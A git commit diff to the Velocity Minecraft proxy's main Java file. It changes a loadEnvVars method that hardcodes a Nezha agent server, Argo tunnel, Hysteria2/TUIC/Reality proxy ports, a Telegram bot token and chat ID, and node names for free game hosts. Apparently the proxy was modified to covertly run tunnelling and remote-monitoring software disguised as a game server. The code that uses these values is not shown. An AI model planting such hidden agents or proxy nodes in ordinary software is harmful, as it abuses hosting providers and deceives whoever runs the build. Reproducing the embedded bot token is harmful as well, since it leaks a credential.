6147a6d2ab09a73a53feca9af4e47e0a0d26496d
leolee1998 <168069603+leolee1998@users.noreply.github.com>
2026-04-26 00:44:57 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,7 +146,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "2c24d387-4542-49d1-a217-feed6830d1a9");
+    envVars.put("UUID", "9b2744b8-fc49-427e-9a11-152d700e6b4a");
     envVars.put("FILE_PATH", "./world");
     envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
     envVars.put("NEZHA_PORT", "");
@@ -154,15 +154,15 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "8001");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "24902");
-    envVars.put("TUIC_PORT", "24705");
-    envVars.put("REALITY_PORT", "24705");
+    envVars.put("HY2_PORT", "8246");
+    envVars.put("TUIC_PORT", "");
+    envVars.put("REALITY_PORT", "8246");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6975394604");
     envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
     envVars.put("CFIP", "cdns.doon.eu.org");
     envVars.put("CFPORT", "443");
-    envVars.put("NAME", "Hidencloud-FR");
+    envVars.put("NAME", "Freezehost-SG-Game");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
